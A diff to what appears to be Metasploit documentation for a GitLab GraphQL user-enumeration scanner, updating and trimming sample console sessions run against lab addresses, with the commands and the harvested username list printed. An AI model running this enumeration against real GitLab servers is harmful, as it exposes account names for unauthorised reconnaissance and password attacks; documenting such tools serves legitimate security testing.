@@ -51,8 +51,8 @@ of a [relative URL](https://docs.gitlab.com/omnibus/settings/configuration.html#
 
 ```
 msf6 > use auxiliary/scanner/http/gitlab_graphql_user_enum
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set RHOST 10.0.0.6
-RHOST => 10.0.0.6
+msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set RHOST 10.0.0.13
+RHOST => 10.0.0.13
 msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set RPORT 80
 RPORT => 80
 msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set SSL false
@@ -60,11 +60,12 @@ msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set SSL false
 SSL => false
 msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > run
 
-[+] Userlist stored at /home/albinolobster/.msf4/loot/20211229065146_default_10.0.0.6_gitlab.users_537462.txt
+[+] Enumerated 142 GitLab users
+[+] Userlist stored at /home/albinolobster/.msf4/loot/20220311065704_default_10.0.0.13_gitlab.users_704600.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > cat /home/albinolobster/.msf4/loot/20211229065146_default_10.0.0.6_gitlab.users_537462.txt
-[*] exec: cat /home/albinolobster/.msf4/loot/20211229065146_default_10.0.0.6_gitlab.users_537462.txt
+msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > cat /home/albinolobster/.msf4/loot/20220311065704_default_10.0.0.13_gitlab.users_704600.txt
+[*] exec: cat /home/albinolobster/.msf4/loot/20220311065704_default_10.0.0.13_gitlab.users_704600.txt
 
 test150
 test149
@@ -207,29 +208,6 @@ test1
 test
 support-bot
 alert-bot
-root
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > 
-```
-
-### GitLab 13.10.2 on Ubuntu 20.04.2 x64
-
-```
-msf6 > use auxiliary/scanner/http/gitlab_graphql_user_enum
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set RHOST 10.0.0.9
-RHOST => 10.0.0.9
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set RPORT 80
-RPORT => 80
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > set SSL false
-[!] Changing the SSL option's value may require changing RPORT!
-SSL => false
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > run
-
-[+] Userlist stored at /home/albinolobster/.msf4/loot/20211229070855_default_10.0.0.9_gitlab.users_748865.txt
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > cat /home/albinolobster/.msf4/loot/20211229070855_default_10.0.0.9_gitlab.users_748865.txt
-[*] exec: cat /home/albinolobster/.msf4/loot/20211229070855_default_10.0.0.9_gitlab.users_748865.txt
-
 root
 msf6 auxiliary(scanner/http/gitlab_graphql_user_enum) > 
 ```
